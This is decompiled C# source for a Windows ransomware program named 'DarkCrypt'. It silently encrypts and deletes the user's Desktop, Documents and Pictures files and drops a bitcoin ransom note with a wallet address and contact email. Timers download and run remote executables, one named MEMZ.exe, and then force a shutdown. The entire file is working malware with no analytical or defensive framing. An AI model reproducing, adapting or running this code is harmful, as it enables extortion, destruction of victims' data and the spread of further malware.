using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using WindowsFormsApp1.Properties;

namespace RansomwarePOC;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";

	private const string ENCRYPT_PASSWORD = "Password1";

	private const string BITCOIN_ADDRESS = "bc1q4r4kjrer2l0j0ahlh5cfua3kja0n7cj90u3wcv";

	private const string BITCOIN_RANSOM_AMOUNT = "1";

	private const string EMAIL_ADDRESS = "exploitvenus@gmail.com";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your files have been encrypted.\n\nTo unlock them, please send 1 bitcoin(s) to BTC address: bc1q4r4kjrer2l0j0ahlh5cfua3kja0n7cj90u3wcv\nAfterwards, please email your transaction ID to: exploitvenus@gmail.com\n\nThank you and have a nice day!\n\nEncryption Log:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private IContainer components = null;

	private TextBox txtBitcoinAddress;

	private TextBox txtEmailAddress;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private PictureBox pictureBox3;

	private PictureBox pictureBox4;

	private Timer timer1;

	private Label lblCount;

	private Timer DownloadHelperTimer;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("ERROR PLEASE FIND A NEW LOCATION TO EXECUTE THIS PROGAM");
			Application.Exit();
		}
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey.SetValue("Wallpaper", "", RegistryValueKind.String);
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___RECOVER__FILES__.jcrypt.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)lblCount).set_Text("Your files (count: " + encryptedFileCount + ") have been encrypted!");
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)txtBitcoinAddress).set_Text("bc1q4r4kjrer2l0j0ahlh5cfua3kja0n7cj90u3wcv");
		((Control)txtEmailAddress).set_Text("exploitvenus@gmail.com");
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".jcrypt"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "Password1");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".jcrypt", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void txtEmailAddress_TextChanged(object sender, EventArgs e)
	{
	}

	private void label5_Click(object sender, EventArgs e)
	{
	}

	private void txtBitcoinAddress_TextChanged(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://github.com/MALWARECODING/LogMeG/raw/main/MEMZ.exe", "MEMZ.exe");
		}
		Process.Start("MEMZ.exe");
		Process.Start("shutdown", "/s /t 0");
		timer1.Stop();
	}

	private void DownloadHelperTimer_Tick(object sender, EventArgs e)
	{
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://github.com/MALWARECODING/LogMeG/raw/main/DecryptHelper.exe", "DecryptHelper.exe");
		}
		Process.Start("DecryptHelper.exe");
		DownloadHelperTimer.Stop();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Expected O, but got Unknown
		//IL_044b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0455: Expected O, but got Unknown
		components = new Container();
		txtBitcoinAddress = new TextBox();
		txtEmailAddress = new TextBox();
		pictureBox4 = new PictureBox();
		pictureBox3 = new PictureBox();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		timer1 = new Timer(components);
		lblCount = new Label();
		DownloadHelperTimer = new Timer(components);
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_Location(new Point(185, 306));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(551, 22));
		((Control)txtBitcoinAddress).set_TabIndex(3);
		((Control)txtBitcoinAddress).set_Text("1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtBitcoinAddress).add_TextChanged((EventHandler)txtBitcoinAddress_TextChanged);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_Location(new Point(185, 334));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(551, 22));
		((Control)txtEmailAddress).set_TabIndex(4);
		((Control)txtEmailAddress).set_Text("\r\nexploitvenus@gmail.com");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtEmailAddress).add_TextChanged((EventHandler)txtEmailAddress_TextChanged);
		((Control)pictureBox4).set_BackgroundImage((Image)(object)Resources._1_Hour_Countdown_Timer_4K__no_sound__Black);
		((Control)pictureBox4).set_BackgroundImageLayout((ImageLayout)3);
		((Control)pictureBox4).set_Location(new Point(13, 253));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(150, 60));
		pictureBox4.set_TabIndex(8);
		pictureBox4.set_TabStop(false);
		((Control)pictureBox3).set_BackgroundImage((Image)(object)Resources.Knipsel);
		((Control)pictureBox3).set_BackgroundImageLayout((ImageLayout)3);
		((Control)pictureBox3).set_Location(new Point(185, 35));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(551, 256));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox3.set_TabIndex(7);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox2).set_BackgroundImage((Image)(object)Resources.download);
		((Control)pictureBox2).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox2).set_Location(new Point(13, 183));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(150, 63));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(6);
		pictureBox2.set_TabStop(false);
		pictureBox1.set_Image((Image)(object)Resources.clipart_shield_animated_2);
		((Control)pictureBox1).set_Location(new Point(12, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(151, 164));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(5);
		pictureBox1.set_TabStop(false);
		timer1.set_Enabled(true);
		timer1.set_Interval(3600000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)lblCount).set_AutoSize(true);
		((Control)lblCount).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(SystemColors.ControlLightLight);
		((Control)lblCount).set_Location(new Point(12, 316));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(0, 20));
		((Control)lblCount).set_TabIndex(9);
		DownloadHelperTimer.set_Enabled(true);
		DownloadHelperTimer.add_Tick((EventHandler)DownloadHelperTimer_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(748, 373));
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).get_Controls().Add((Control)(object)pictureBox4);
		((Control)this).get_Controls().Add((Control)(object)pictureBox3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("DarkCrypt");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
